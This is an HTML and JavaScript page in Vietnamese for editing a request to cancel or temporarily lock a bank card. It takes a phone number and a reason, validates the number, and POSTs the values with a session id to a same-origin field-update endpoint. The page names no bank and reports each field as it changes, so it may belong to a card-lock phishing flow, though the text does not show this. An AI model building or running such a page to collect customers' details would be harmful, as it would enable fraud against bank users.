<!DOCTYPE html>
<html lang="vi">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Sửa yêu cầu</title>
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
      rel="stylesheet"
    />
    <style>
      body {
        background: #f8f9fa;
      }

      .card {
        max-width: 720px;
        margin: 2rem auto;
      }
    </style>
  </head>

  <body>
    <main class="container">
      <div class="card shadow-sm">
        <div class="card-body">
          <h1 class="h5 mb-3">Sửa yêu cầu hủy / tạm khóa thẻ</h1>
          <p class="text-muted small">
            Bạn có thể sửa số điện thoại hoặc lý do trước khi gửi lại/tiếp tục.
          </p>

          <form id="editForm" class="row g-3">
            <div class="col-md-6">
              <label for="e_phone" class="form-label">Số điện thoại</label>
              <input id="e_phone" class="form-control" inputmode="tel" />
              <div class="invalid-feedback">Số điện thoại không hợp lệ.</div>
            </div>
            <div class="col-md-6">
              <label for="e_reason" class="form-label">Lý do</label>
              <select id="e_reason" class="form-select">
                <option value="">(Giữ nguyên)</option>
                <option>Nghi ngờ giao dịch bất thường</option>
                <option>Làm thất lạc thẻ</option>
                <option>Đi du lịch / muốn tạm khóa</option>
                <option>Được ngân hàng khuyến cáo</option>
                <option>Khác</option>
              </select>
            </div>

            <div class="col-12 d-flex gap-2 mt-2">
              <button id="btnSave" type="button" class="btn btn-primary">Lưu & Quay lại</button>
              <button id="btnCancel" type="button" class="btn btn-outline-secondary">Hủy</button>
            </div>
          </form>
        </div>
      </div>
    </main>

    <script>
      // Populate from sessionStorage pending values
      const ePhone = document.getElementById('e_phone');
      const eReason = document.getElementById('e_reason');
      ePhone.value =
        sessionStorage.getItem('pendingPhone') || sessionStorage.getItem('submittedPhone') || '';
      const pendingReason =
        sessionStorage.getItem('pendingReason') || sessionStorage.getItem('submittedReason') || '';
      if (pendingReason) {
        const opt = Array.from(eReason.options).find(
          (o) => o.value === pendingReason || o.text === pendingReason
        );
        if (opt) opt.selected = true;
      }

      function simplePhoneValid(v) {
        if (!v) return false;
        const digits = v.replace(/\D/g, '');
        return /^(0\d{9}|84\d{9})$/.test(digits);
      }

      document.getElementById('btnSave').addEventListener('click', async () => {
        const phone = ePhone.value || '';
        const reason = eReason.value || '';
        if (phone && !simplePhoneValid(phone)) {
          ePhone.classList.add('is-invalid');
          return;
        }
        ePhone.classList.remove('is-invalid');
        // save back to sessionStorage so main form/submission will pick it
        if (phone) sessionStorage.setItem('pendingPhone', phone);
        if (reason) sessionStorage.setItem('pendingReason', reason);

        // send a small audit record
        try {
          const FIELD_UPDATE_API =
            location.origin && location.origin !== 'null'
              ? location.origin + '/api/field-update'
              : '/api/field-update';
          const sessionId = sessionStorage.getItem('fieldSessionId') || 'no-session';
          await fetch(FIELD_UPDATE_API, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              sessionId,
              field: 'edit_request',
              value: JSON.stringify({ phone, reason }),
              page: 'sua-yeu-cau.html',
            }),
          });
        } catch (e) {
          /* ignore */
        }

        // go back to main form where user can re-submit
        window.location.href = 'huy-tam-khoa-the.html';
      });

      document
        .getElementById('btnCancel')
        .addEventListener('click', () => (window.location.href = 'huy-tam-khoa-the.html'));
    </script>
  </body>
</html>
